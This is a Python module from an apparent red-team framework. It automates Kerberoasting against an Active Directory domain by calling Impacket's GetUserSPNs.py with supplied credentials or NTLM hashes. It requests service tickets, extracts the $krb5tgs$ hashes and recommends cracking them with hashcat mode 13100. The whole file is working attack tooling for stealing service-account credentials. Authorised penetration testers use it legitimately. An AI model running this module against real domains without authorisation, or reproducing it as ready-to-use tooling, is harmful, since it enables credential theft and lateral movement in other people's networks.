"""RedTeam Framework - Module: active_directory/kerberoast"""
from __future__ import annotations
import re
from typing import Any, Dict, List
from framework.modules.base import BaseModule, Finding, ModuleResult, Severity

class KerberoastModule(BaseModule):
    def info(self) -> Dict[str, Any]:
        return {"name":"kerberoast","description":"Extract Kerberos TGS tickets for service accounts via Impacket GetUserSPNs.","author":"RTF Core Team","category":"active_directory","version":"1.0","references":["https://github.com/fortra/impacket","https://attack.mitre.org/techniques/T1558/003/"]}
    def _declare_options(self) -> None:
        self._register_option("domain","AD domain FQDN",required=True)
        self._register_option("dc_ip","Domain Controller IP",required=True)
        self._register_option("username","Domain username",required=True)
        self._register_option("password","Domain password",required=False,default="")
        self._register_option("hashes","NTLM hashes LM:NT",required=False,default="")
        self._register_option("output_file","Save hashes to file",required=False,default="")
        self._register_option("timeout","Timeout in seconds",required=False,default=120,type=int)
    async def run(self) -> ModuleResult:
        domain=self.get("domain"); dc_ip=self.get("dc_ip"); username=self.get("username")
        password=self.get("password"); hashes=self.get("hashes"); output_file=self.get("output_file"); timeout=self.get("timeout")
        if not password and not hashes:
            return ModuleResult(success=False,error="Either 'password' or 'hashes' must be provided.")
        self.require_tool("GetUserSPNs.py")
        cmd=["GetUserSPNs.py",f"{domain}/{username}","-dc-ip",dc_ip]
        if password: cmd+=["-p",password]
        elif hashes: cmd+=["-hashes",hashes]
        cmd+=["-request"]
        if output_file: cmd+=["-outputfile",output_file]
        stdout,stderr,rc = await self.run_command_async(cmd, timeout=timeout)
        spns=[]; hashes_found=[]
        for line in stdout.splitlines():
            line=line.strip()
            if re.match(r"^\S+/\S+",line) and not line.startswith("$krb5tgs"):
                parts=re.split(r"\s{2,}",line)
                if len(parts)>=2: spns.append({"spn":parts[0],"account":parts[1]})
            if line.startswith("$krb5tgs$"): hashes_found.append(line)
        findings=[]
        for s in spns:
            findings.append(self.make_finding(title=f"Kerberoastable account: {s['account']}",target=domain,severity=Severity.HIGH,description=f"SPN: {s['spn']}",evidence=s,tags=["kerberoast","active_directory"]))
        if hashes_found:
            findings.append(self.make_finding(title=f"TGS hashes obtained ({len(hashes_found)})",target=domain,severity=Severity.CRITICAL,description="Use hashcat mode 13100.",evidence={"hash_count":len(hashes_found)},tags=["kerberoast","hash"]))
        return ModuleResult(success=True,output={"spns_found":len(spns),"hashes_captured":len(hashes_found),"spns":spns},findings=findings,raw_output=stdout)
